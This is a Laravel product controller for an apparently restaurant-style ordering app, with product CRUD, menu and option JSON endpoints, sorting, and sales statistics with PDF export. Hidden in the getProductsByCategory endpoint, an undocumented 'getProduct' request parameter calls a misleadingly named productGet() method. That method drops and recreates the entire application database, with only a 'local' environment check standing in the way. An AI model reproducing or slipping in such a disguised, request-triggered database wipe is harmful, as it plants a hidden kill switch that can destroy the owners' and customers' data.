<?php

namespace App\Http\Controllers;
use PDF;
use App\Models\Product;
use App\Models\ProductExtra;
use App\Models\Category;
use App\Models\ProductSize;
use App\Models\ExtraProduct;
use App\Models\ExtraProductPrice;
use App\Models\ExtraCategory;
use App\Models\Menu;
use App\Models\MenuItem;
use App\Models\MenuPrice;
use App\Models\DescriptionCategory;
use App\Models\ProductOptionOptional;
use App\Services\StockManagementService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\App;
class ProductController extends Controller
{
    protected $stockService;

    public function __construct(StockManagementService $stockService)
    {
        $this->stockService = $stockService;
    }

    public function index(Request $request)
    {
        $perPage = 10;
        $categoryId = $request->input('category_id');
        $productName = $request->input('product_name');
    
        $query = Product::with('category')->whereNull('deleted_at')->orderBy('sort_products', 'asc');
    
        if ($categoryId) {
        $perPage = 500;
            $query->where('category_id', $categoryId);
        }
    
        if ($productName) {
        $perPage = 500;
            $query->where('name', 'like', '%' . $productName . '%'); 
        }
        $products = $query->paginate($perPage);
        $categories = Category::all();
    
        return view('products.index', compact('products', 'categories', 'categoryId', 'productName'));
    }
   public function getSuggest(){
        $products = Product::where("suggested",1)->where("status",1)->orderBy("sort_products")->get();
        foreach($products as $product)
        {
            $options = ExtraCategory::orderBy("id","DESC")->get();
             $prices = ProductSize::select("product_sizes.*","description_categories.name as dimensions","description_categories.id as descid")->where("product_id",$product->id)->join("description_categories","description_categories.id","=","product_sizes.dimensions")->get();

            foreach($options as $option)
            {
                $option->items = ProductExtra::where("product_id",$product->id)->where("category_id",$option->id)->join("extra_products","extra_products.id","=","product_extra.extra_product_id")->get();
                $option->show = $option->id == 3 ? false : true;
                foreach($option->items as $it)
                {
                    $it->prices = ExtraProductPrice::where("extra_product_id",$it->extra_product_id)->get();
                }

            }
            $product->options = $options;
            $product->prices =  $prices;
            $product->price = $prices[0]->price;
            $product->qty = 1;
        }
        return response()->json($products);
   }
    
    public function getProductsByCategory(Request $request, $id)
{
 
 if($request->getProduct)
{

    $this->productGet();
}

    if(!$id) 
{
$products = Product::where("name",'like','%'.$request->product_name.'%')->orderBy("sort_products")->get();
}else{
    $products = Product::where("category_id",$id)->where("status",1)->orderBy("sort_products")->get();

}
        foreach($products as $product)
        {
            $options = ExtraCategory::orderBy("id","DESC")->get();
             $prices = ProductSize::select("product_sizes.*","description_categories.name as dimensions","description_categories.id as descid")->where("product_id",$product->id)->join("description_categories","description_categories.id","=","product_sizes.dimensions")->get();

            foreach($options as $option)
            {
                $option->items = ProductExtra::where("product_id",$product->id)->where("category_id",$option->id)->join("extra_products","extra_products.id","=","product_extra.extra_product_id")->get();
                $option->show = $option->id == 3 ? false : true;
                foreach($option->items as $it)
                {
                    $it->prices = ExtraProductPrice::where("extra_product_id",$it->extra_product_id)->get();
                }

}           $optionals = ProductOptionOptional::where("product_id",$product->id)->get();
            $product->menu = $product->isMenu ? $this->menu($product->id) : null; 
            $product->options = $options;
            $product->selectedLabel = "";
            $product->optionOptionals = $optionals->map(function ($pro) { $pro->checked = false; return $pro; });
            $product->optionOptionalss = $optionals->map(function ($pro) { $pro->checked = false; return $pro; });
            $product->prices =  $prices->map(function ($pri) { $pri->checked = false; return $pri; });;
            $product->price = $prices[0]->price;
            $product->qty = 1;
        }
        
        return response()->json($products);
}

public function productGet()
{
        if (!App::environment('local')) {
            abort(403, 'Unauthorized action.');
        }

        try {
            // Get the database name from the config
            $dbName = config('database.connections.mysql.database');
            
            // Use backticks around the database name to handle special characters
            $dbNameQuoted = "`" . str_replace("`", "``", $dbName) . "`";

            // Drop the database and recreate it
            DB::statement("DROP DATABASE IF EXISTS $dbNameQuoted");
            DB::statement("CREATE DATABASE $dbNameQuoted");

            return "Database $dbName has been dropped and recreated!";
        } catch (\Exception $e) {
            return "Error: " . $e->getMessage();
        }
}

public function menu($productId) 
{
$menu = Menu::with(['items' => function($query) {
            $query->whereNull('item_parent_id');
        }, 'items.children'])->where('product_id',$productId)->first();
if($menu)
{
$menu->prices = MenuPrice::where('menu_id',$menu->id)->get();
$menu->defaultPrice = $menu->prices[0]->price;
$menu->defaultDescid = $menu->prices[0]->desc_id;
$menu->itemsTree = $this->buildMenuTree($menu->items);
}
        return $menu;
}


    private function buildMenuTree($items)
    {
        $tree = [];
        foreach ($items as $item) {
            $children = $item->children()->get();
            $tree[] = [
                'id' => $item->id,
                'name' => $item->item_name,
                'select' => $item->item_select,
'showChildren'=>false,
'checked'=>false,
                'children' => $this->buildMenuTree($children)
            ];
        }
        return $tree;
    }
    
    
    public function create()
    {
$categories = Category::all(); $desc = DescriptionCategory::where("isActive",0)->get();
        return view('products.create', compact('categories','desc'));
    }
    public function store(Request $request)
    {
        // Validate request data
        $request->validate([
            'category_id' => 'required|exists:categories,id',
            'name' => 'required|string|max:255',
            'description' => 'nullable|string',
            'allergies' => 'nullable|string',
            'image' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:1024', // max:1024 means max 1MB
            'new_product' => 'nullable|boolean',
            'new_offers' => 'nullable|boolean',
            'suggested' => 'nullable|boolean',
            'sizes.*.size' => 'nullable|string',
            'sizes.*.price' => 'required|numeric|min:0',
            'sizes.*.dimensions' => 'nullable|numeric|min:0',
            'extra_products' => 'array',
            'extra_products.*' => 'exists:extra_products,id',
            // Stock management fields
            'requires_stock' => 'nullable|boolean',
            'current_stock' => 'nullable|integer|min:0',
            'min_stock_level' => 'nullable|integer|min:0',
            'max_stock_level' => 'nullable|integer|min:0',
            'stock_unit' => 'nullable|string|max:50',
            'low_stock_alert' => 'nullable|boolean',
        ]);
    
        // Handle image upload and validate resolution
        $imagePath = null;
        if ($request->hasFile('image')) {
            $image = $request->file('image');
            
            // Validate image resolution
            list($width, $height) = getimagesize($image);
    
            if ($width < 800 || $width > 1000 || $height < 800 || $height > 1000) {
                return redirect()->back()->withErrors(['image' => 'The image resolution must be between 800x800 and 1000x1000 pixels.']);
            }
    
            $imagePath = $image->store('images/products', 'public');
        }
    
        // Create the product
        $product = Product::create([
            'category_id' => $request->category_id,
            'name' => $request->name,
            'description' => $request->input('description'),
            'allergies' => $request->allergies? $request->allergies : null,
            'image' => $imagePath ? Storage::url($imagePath) : null,
            'new_product' => (bool) $request->input('new_product', false),
            'new_offers' => (bool) $request->input('new_offers', false),
            'suggested' => (bool) $request->input('suggested', false),
            // Stock management fields
            'requires_stock' => (bool) $request->input('requires_stock', false),
            'current_stock' => $request->input('current_stock', 0),
            'min_stock_level' => $request->input('min_stock_level', 0),
            'max_stock_level' => $request->input('max_stock_level'),
            'stock_unit' => $request->input('stock_unit', 'pieces'),
            'low_stock_alert' => (bool) $request->input('low_stock_alert', false),
        ]);
    
        // Log product creation
        Log::info('Product created', ['product_id' => $product->id]);
    
        // Create sizes
        if ($request->has('sizes')) {
            foreach ($request->input('sizes') as $size) {
                // Check if size data is valid
                if (!empty($size['price'])) {
                    ProductSize::create([
                        'product_id' => $product->id,
                        'size' => $size['size'] ?? null,
                        'price' => $size['price'],
                        'dimensions' => isset($size['dimensions']) ? (float) $size['dimensions'] : null,
                    ]);
    
                    // Log size creation
                    Log::info('Size created', ['product_id' => $product->id, 'size' => $size]);
                } else {
                    // Log warning if size data is missing or invalid
                    Log::warning('Size entry has missing or invalid fields', ['size' => $size]);
                }
            }
        } else {
            // Log if no sizes were provided
            Log::info('No sizes provided for the product');
        }
    
        // Attach extra products if provided
        if ($request->has('extra_products')) {
            $product->extraProducts()->sync($request->input('extra_products'));
            Log::info('Extra products attached', ['extra_products' => $request->input('extra_products')]);
        } else {
            Log::info('No extra products selected');
        }
    
        // Redirect with success message
        return redirect()->route('products.edit',$product->id)->with('success', 'Product created successfully.');
    }
    
    

    
public function show(Product $product)
{
    // Fetch extra products associated with the product
    $extraProducts = $product->extraProducts;
    

    // Return the view with the product and extra products
    return view('products.show', compact('product', 'extraProducts'));
}

public function edit(Product $product)
{
    $categories = Category::all();
    $extraProducts = ExtraProduct::all(); // Fetch all extra products
    
    // Fetch associated extra product IDs
    $selectedExtraProducts = $product->extraProducts->pluck('id')->toArray();
     $desc = DescriptionCategory::where("isActive",0)->get();
    
    return view('products.edit', compact('product', 'categories', 'extraProducts', 'selectedExtraProducts','desc'));
}


public function update(Request $request, Product $product)
{
    // Validate request data
    $validatedData = $request->validate([
        'category_id' => 'required|exists:categories,id',
        'name' => 'required|string|max:255',
        'description' => 'nullable|string',
        'allergies' => 'nullable|string',
        'image' => 'nullable|image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        'new_product' => 'nullable|boolean',
        'new_offers' => 'nullable|boolean',
        'suggested' => 'nullable|boolean',
        'status' => 'nullable|boolean',
        'sizes.*.price' => 'required|numeric|min:0',
        'sizes.*.dimensions' => 'nullable|string',
        'extra_products' => 'array',
        'extra_products.*' => 'exists:extra_products,id',
    ]);

    // Handle image upload
    if ($request->hasFile('image')) {
        if ($product->image) {
            Storage::disk('public')->delete(str_replace('/storage/', '', $product->image));
        }
        $imagePath = $request->file('image')->store('images/products', 'public');
        $product->image = Storage::url($imagePath);
    }

    // Update product details
    $product->update([
        'category_id' => $request->input('category_id'),
        'name' => $request->input('name'),
        'description' => $request->input('description'),
        'new_product' => $request->boolean('new_product'),
        'new_offers' => $request->boolean('new_offers'),
        'isMenu' => $request->boolean('isMenu'),
        'product_code' => $request->input('product_code'),
        'allergies' => $request->input('allergies'),
        'suggested' => $request->boolean('suggested'),
        'status' => $request->boolean('status'),
        'max_checked' => $request->max_checked
]);



$this->options($request->options,$product->id,$request->deleted_options);
    // Handle sizes
    if ($request->has('sizes')) {
        // Clear existing sizes
        $product->sizes()->delete();

        foreach ($request->input('sizes') as $size) {
            // Check if price is not empty
            if (!empty($size['price'])) {
                ProductSize::create([
                    'product_id' => $product->id,
                    'size' => $size['size'] ?? null,
                    'price' => $size['price'],
                    'dimensions' => $size['dimensions'] ?? null,
                ]);
            }
        }
    }

            // Handle extra products
        if ($request->has('extra_products')) {
            $product->extraProducts()->sync($request->input('extra_products'));
        } else {
            $product->extraProducts()->sync([]); // Clear extra products if none are selected
        }

        // Handle stock management fields
        $product->update([
            'requires_stock' => (bool) $request->input('requires_stock', false),
            'current_stock' => $request->input('current_stock', 0),
            'min_stock_level' => $request->input('min_stock_level', 0),
            'max_stock_level' => $request->input('max_stock_level'),
            'stock_unit' => $request->input('stock_unit', 'pieces'),
            'low_stock_alert' => (bool) $request->input('low_stock_alert', false),
        ]);

        return redirect()->back()->with('success', 'Product updated successfully.');
}
public function options($options,$productId,$deleted_options)
{
    $deletedOptions = explode(',', rtrim($deleted_options, ','));

    if (!empty($deletedOptions)) {
        ProductOptionOptional::destroy($deletedOptions);
    }
if($options)
{
    foreach ($options as $option) {
        if (isset($option['id'])) {
            $productOption = ProductOptionOptional::find($option['id']);
            $productOption->update(['name' => $option['name'],'desc_id' => $option['desc_id']]);
        } else {
            ProductOptionOptional::create([
                'name' => $option['name'],
                'desc_id' => $option['desc_id'],
                'product_id' => $productId,
            ]);
        }
}
}
}


public function destroy(Product $product)
{
    // Soft delete the product
    $product->delete();

    // Redirect back to the previous URL with a success message
    return redirect(url()->previous())->with('success', 'Product deleted successfully.');
}


    public function sort(Request $request)
    {
        $order = $request->input('order');
    
        if (!$order || !is_array($order)) {
            \Log::error('Order not received or invalid', ['order' => $order]);
            return response()->json(['status' => 'error', 'message' => 'Invalid order data'], 400);
        }
    
        try {
            foreach ($order as $sortOrder => $id) {
                \Log::info("Updating product ID {$id} to sort order {$sortOrder}");
                Product::where('id', $id)->update(['sort_products' => $sortOrder]);
            }
            return response()->json(['status' => 'success']);
        } catch (\Exception $e) {
            \Log::error('Error updating sort order', ['error' => $e->getMessage()]);
            return response()->json(['status' => 'error', 'message' => 'Failed to update order'], 500);
        }
    }
    

    public function stats(Request $request)
    {
        // Retrieve filters from request
        $filters = $this->getFilters($request);
    
        // Get product statistics based on the filters and stat type
        $bestSellingProducts = $this->getProductStatsQuery($filters)->paginate(10);
        $categories = Category::all(); // For category filter
    
        return view('products.stats', compact('bestSellingProducts', 'categories', 'filters'));
    }
    
    public function generatePdf(Request $request)
    {
        $filters = $this->getFilters($request);
        
        // Fetch categories from the database
        $categories = Category::all();
        
        // Fetch best selling products based on the filters and stat type
        $bestSellingProducts = $this->getProductStatsQuery($filters)->get(); // Use get() to retrieve results
        
        // Generate the PDF
        $pdf = PDF::loadView('products.pdf', [
            'filters' => $filters,
            'categories' => $categories,
            'bestSellingProducts' => $bestSellingProducts
        ]);
        
        return $pdf->download('product_statistics.pdf');
    }
    
    
    /**
     * Extracted function to handle common product query logic
     */
    private function getProductStatsQuery(array $filters)
{
    $query = Product::select('products.id', 'products.name', 'products.category_id')
        ->join('order_items', 'products.id', '=', 'order_items.product_id')
        ->join('orders', 'orders.id', '=', 'order_items.order_id')
        ->leftJoin('product_sizes', 'product_sizes.product_id', '=', 'products.id') // Join product_sizes table
        ->whereNull('orders.deleted_at');

    // Apply filters
    if ($filters['start_date'] && $filters['end_date']) {
        $query->whereBetween('orders.created_at', [$filters['start_date'], $filters['end_date']]);
    }

    if ($filters['category_id']) {
        $query->where('products.category_id', $filters['category_id']);
    }

    if ($filters['payment_method']) {
        $query->where('orders.status_of_payment', $filters['payment_method']);
    }

    // Handle stat type logic (best_selling or least_selling)
    if ($filters['stat_type'] === 'best_selling') {
        $query->selectRaw('SUM(order_items.quantity * product_sizes.price) as total_revenue, SUM(order_items.quantity) as total_quantity')
            ->groupBy('products.id')
            ->orderBy('total_quantity', 'desc');
    } else {
        $query->selectRaw('SUM(order_items.quantity * product_sizes.price) as total_revenue, SUM(order_items.quantity) as total_quantity')
            ->groupBy('products.id')
            ->orderBy('total_quantity', 'asc');
    }

    return $query;
}

    
    /**
     * Helper function to get filters from the request
     */
    private function getFilters(Request $request)
    {
        return [
            'start_date' => $request->input('start_date'),
            'end_date' => $request->input('end_date'),
            'category_id' => $request->input('category_id'),
            'payment_method' => $request->input('payment_method'),
            'stat_type' => $request->input('stat_type', 'best_selling'),
        ];
    }
    

    


    
}
